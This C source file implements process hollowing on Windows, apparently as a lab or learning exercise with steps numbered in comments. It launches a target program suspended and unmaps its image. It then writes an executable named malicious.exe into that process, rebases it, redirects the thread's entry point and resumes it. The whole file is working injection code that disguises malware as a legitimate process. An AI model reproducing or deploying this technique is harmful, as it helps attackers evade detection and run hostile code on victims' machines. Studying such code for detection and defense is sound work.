#include <Windows.h>
#include <stdio.h>
#include <Winternl.h>

typedef NTSTATUS (WINAPI *_NtQueryInformationProcess) (
    HANDLE, 
    PROCESSINFOCLASS,
    PVOID,
    ULONG,
    PULONG
);

typedef NTSTATUS (WINAPI *_NtUnmapViewOfSection) (
    HANDLE,
    PVOID
);

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

int main(void) {

	/***********************************************************************************|
	|																					|
	| (1) create target process															|
	|																					|
	************************************************************************************/

	STARTUPINFO si;
	PROCESS_INFORMATION pi; 
	char TgtProcName[] = "C:\\Users\\aaron\\Desktop\\proc_replace\\target.exe";

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	CreateProcessA(
		NULL, 
		TgtProcName, 
		NULL, 
		NULL, 
		FALSE, 
		CREATE_SUSPENDED, 
		NULL, 
		NULL, 
		&si, 
		&pi
	);

	if (pi.hProcess == NULL) {
		printf("failed to create target process\n");
		exit(1);
	}

	/***********************************************************************************|
	|																					|
	| (2) get target process's image base address										|
	|																					|
	************************************************************************************/

	/***********************************************|
	| (a) get address of NtQueryInformationProcess 	|
	|												|
	************************************************/

	HANDLE hNtdll;
	_NtQueryInformationProcess NtQueryInfoProc;																

	hNtdll = LoadLibraryA("ntdll");																				
	if (hNtdll == NULL) {
		printf("failed to load ntdll.dll\n");
		exit(1);
	}

	NtQueryInfoProc = (_NtQueryInformationProcess)GetProcAddress(
		hNtdll, 
		"NtQueryInformationProcess"
	);

	if (NtQueryInfoProc == NULL) {
		printf("failed to get address of NtQueryInformationProcess\n");
		exit(1);
	}

	/***********************************************|
	| (b) get address of target process's PEB		|
	|												|
	************************************************/

	PROCESS_BASIC_INFORMATION pBasicInfo;
	DWORD dwLen = 0;
	NTSTATUS status;

	status = NtQueryInfoProc(
		pi.hProcess, 
		ProcessBasicInformation, 
		&pBasicInfo,
		sizeof(PROCESS_BASIC_INFORMATION), 
		&dwLen
	);

	if (NT_ERROR(status) || !pBasicInfo.PebBaseAddress) {
		printf("failed to get target process information\n");
		exit(1);
	}

	/***********************************************|
	| (c) read PEB and get address					|
	|												|
	************************************************/

	PEB peb;																											
	DWORD dwSuccess;
	PVOID pTgtBaseAddr;

	dwSuccess = ReadProcessMemory(
		pi.hProcess, 
		(LPCVOID)((DWORD)pBasicInfo.PebBaseAddress), 
		&peb, 
		sizeof(peb), 
		NULL
	);

	if (dwSuccess == 0) {
		printf("failed to read peb\n");
		exit(1);
	}

	/* 
	 * See: https://stackoverflow.com/questions/8336214/how-can-i-get-a-process-entry-point-address
	 * We can tell that this is the base address by attaching to the process in the 
	 * debugger and seeing the memory mapping
	 */
	pTgtBaseAddr = peb.Reserved3[1];

	/***********************************************************************************|
	|																					|
	| (3) unmap target process's memory													|
	|																					|
	************************************************************************************/

	/***********************************************|
	| (a) get of NtUnmapViewOfSection address		|
	|												|
	************************************************/

	_NtUnmapViewOfSection NtUnmapView;

	NtUnmapView = (_NtUnmapViewOfSection)GetProcAddress(
		hNtdll, 
		"NtUnmapViewOfSection"
	);

	if (NtUnmapView == NULL) {
		printf("failed to get address of NtUnmapViewOfSection");
		exit(1);
	}

	/***********************************************|
	| (b) unmap memory								|
	|												|
	************************************************/

	status = NtUnmapView(pi.hProcess, pTgtBaseAddr);
	
	if (NT_ERROR(status)) {
		printf("failed to unmap section\n");
		exit(1);
	}

	/***********************************************************************************|
	|																					|
	| (4) load and parse malicious executable											|
	|																					|
	************************************************************************************/

	/***********************************************|
	| (a) get handler to executable					|
	|												|
	************************************************/
	
	HANDLE hFile;
		
	hFile = CreateFileA(
		"C:\\Users\\aaron\\Desktop\\proc_replace\\malicious.exe", 
		GENERIC_READ, 
		FILE_SHARE_READ, 
		NULL, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL
	);

	if (hFile == INVALID_HANDLE_VALUE) {
		printf("failed to open malicious file\n");
		exit(1);
	}

	/***********************************************|
	| (b) load executable							|
	|												|
	************************************************/

	DWORD dwFileSize;
	DWORD dwBytesRead;
	BOOL bSuccess;
	char *buffer;
	
	dwFileSize = GetFileSize(hFile, NULL);
	buffer = malloc(dwFileSize);
	
	bSuccess = ReadFile(
		hFile, 
		(LPVOID)buffer, 
		dwFileSize,
		&dwBytesRead, 
		NULL
	);

	if (!bSuccess) {
		printf("failed to read malicious file\n");
		exit(1);
	}

	/***********************************************|
	| (c) parse executable's headers				|
	|												|
	************************************************/

	PIMAGE_DOS_HEADER pSrcDosHdr;																	
	PIMAGE_NT_HEADERS pSrcNtHdr; // aka "PE header"

	pSrcDosHdr = (PIMAGE_DOS_HEADER)buffer;																	
	pSrcNtHdr = (PIMAGE_NT_HEADERS)((DWORD)pSrcDosHdr + pSrcDosHdr->e_lfanew);											
	
	/***********************************************************************************|
	|																					|
	| (5) write executable to target process's memory									|
	|																					|
	************************************************************************************/

	/***********************************************|
	| (a) allocate memory in target process			|
	|												|
	************************************************/

	PVOID pSrcRemoteImage;
	DWORD dwDeltaBase;
		
	pSrcRemoteImage = VirtualAllocEx(
		pi.hProcess, 
		pTgtBaseAddr, 
		pSrcNtHdr->OptionalHeader.SizeOfImage, 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_EXECUTE_READWRITE
	);

	if (pSrcRemoteImage == NULL) {
		printf("failed allocating memory in target executable\n");
		exit(1);
	}

	// determine difference in bases	
	dwDeltaBase = (DWORD)pTgtBaseAddr - pSrcNtHdr->OptionalHeader.ImageBase; 								

	/***********************************************|
	| (b) write headers								|
	|												|
	************************************************/
	
	// patch malicious executable's image base
	pSrcNtHdr->OptionalHeader.ImageBase = (DWORD)pTgtBaseAddr;

	bSuccess = WriteProcessMemory(
		pi.hProcess, 
		pTgtBaseAddr, 
		buffer, 
		pSrcNtHdr->OptionalHeader.SizeOfHeaders, 
		NULL
	);	

	if (!bSuccess) {
		printf("failed writing malicious file's headers\n");
		exit(1);
	}

	/***********************************************|
	| (c) write sections							|
	|												|
	************************************************/

	PIMAGE_SECTION_HEADER pSrcSecHdr;
	PVOID pDest;
	DWORD i;

	// get first section header 
	pSrcSecHdr = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pSrcNtHdr);

	for (i = 0; i < pSrcNtHdr->FileHeader.NumberOfSections; i++) {
		
		if (pSrcSecHdr->PointerToRawData) {

			pDest = (PVOID)((DWORD)pTgtBaseAddr + pSrcSecHdr->VirtualAddress);

			bSuccess = WriteProcessMemory(
				pi.hProcess,
				pDest,
				&buffer[pSrcSecHdr->PointerToRawData],
				pSrcSecHdr->SizeOfRawData,
				NULL
			);

			if (bSuccess == 0) {
				printf("failed writing one of the malicious file's sections\n");
				exit(1);
			}
		}
		pSrcSecHdr++;
	}

	/***********************************************************************************|
	|																					|
	| (6) rebase malicous code in target process										|
	|																					|
	************************************************************************************/
	
	/***********************************************|
	| (a) if necessary, find relocation table		|
	|												|
	************************************************/


	if (dwDeltaBase) {

		IMAGE_DATA_DIRECTORY RelocTbl;

		pSrcSecHdr = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pSrcNtHdr);

		for (i = 0; i < pSrcNtHdr->FileHeader.NumberOfSections; i++) {

			if (!strncmp(pSrcSecHdr->Name, ".reloc", 6)) {

				RelocTbl = 
					pSrcNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];


	/***********************************************|
	| (b) iterate though relocation blocks			|
	|												|
	************************************************/


				IMAGE_BASE_RELOCATION* pRelocBlockHdr;
				PBASE_RELOCATION_ENTRY pEntries;
				DWORD dwNumEntries;
				DWORD dwRelocTblOffset = 0;

				// iterate though relocation blocks (in the relocation table)
				while (dwRelocTblOffset < RelocTbl.Size) {

					pRelocBlockHdr = 
						(IMAGE_BASE_RELOCATION*)&buffer[pSrcSecHdr->PointerToRawData + 
						dwRelocTblOffset];

					dwRelocTblOffset += 
						sizeof(IMAGE_BASE_RELOCATION);

					dwNumEntries = 
						(pRelocBlockHdr->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
						sizeof(BASE_RELOCATION_ENTRY);

					pEntries = 
						(PBASE_RELOCATION_ENTRY)&buffer[pSrcSecHdr->PointerToRawData + 
						dwRelocTblOffset];


	/***********************************************|
	| (c) iterate though block entries				|
	|												|
	************************************************/


					DWORD j;
					DWORD dwRebaseAddrOffset;

					for (j = 0; j < dwNumEntries; j++) {

						dwRelocTblOffset += sizeof(BASE_RELOCATION_ENTRY);

						if (pEntries[j].Type != 0) {

							dwRebaseAddrOffset = pRelocBlockHdr->VirtualAddress + 
								pEntries[j].Offset;


	/***********************************************|
	| (d) rebase addresses							|
	|												|
	************************************************/

							DWORD dwRebaseAddr = 0;

							// read address to rebase
							dwSuccess = ReadProcessMemory(
								pi.hProcess,
								(LPCVOID)((DWORD)pTgtBaseAddr + dwRebaseAddrOffset),
								&dwRebaseAddr,
								sizeof(DWORD),
								NULL
							);

							if (dwSuccess == 0) {
								printf("failed to read relocation address\n");
								exit(1);
							}

							// rebase
							dwRebaseAddr += dwDeltaBase;

							// write rebased address
							bSuccess = WriteProcessMemory(
								pi.hProcess,
								(PVOID)((DWORD)pTgtBaseAddr + dwRebaseAddrOffset),
								&dwRebaseAddr,
								sizeof(DWORD),
								NULL
							);

							if (!bSuccess) {
								printf("failed to write relocation address\n");
								exit(1);
							}
						}
					}
				}
			}
			pSrcSecHdr++;
		}
	}
	
	/***********************************************************************************|
	|																					|
	| (7) set thread context and resume thread											|
	|																					|
	************************************************************************************/
	 
	/***********************************************|
	| (a) get thread context						|
	************************************************/


	CONTEXT Context;		
	
	ZeroMemory((PVOID)&Context, sizeof(CONTEXT));
	Context.ContextFlags = CONTEXT_INTEGER;	// because we only need to EAX register

	bSuccess = GetThreadContext(
		pi.hThread, 
		(LPCONTEXT)&Context
	);

	if (!bSuccess) {
		printf("error getting thead context\n");
		exit(1);
	}

	/***********************************************|
	| (b) patch EP and set thread context			|
	|												|
	************************************************/

	DWORD dwNewEntry;
		
	dwNewEntry = (DWORD)pTgtBaseAddr + pSrcNtHdr->OptionalHeader.AddressOfEntryPoint;									
	Context.Eax = dwNewEntry;

	bSuccess = SetThreadContext(
		pi.hThread, 
		(LPCONTEXT)&Context
	);

	if (!bSuccess) {
		printf("error setting thead context\n");
		exit(1);
	}

	/***********************************************|
	| (c) resume thread								|
	|												|
	************************************************/

	dwSuccess = ResumeThread(pi.hThread);

	if (dwSuccess == -1) {
		printf("error resuming thread\n");
	}
	
	/***********************************************************************************|
	|																					|
	| (8) cleanup																		|
	|																					|
	************************************************************************************/

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hFile);

	return 0;

}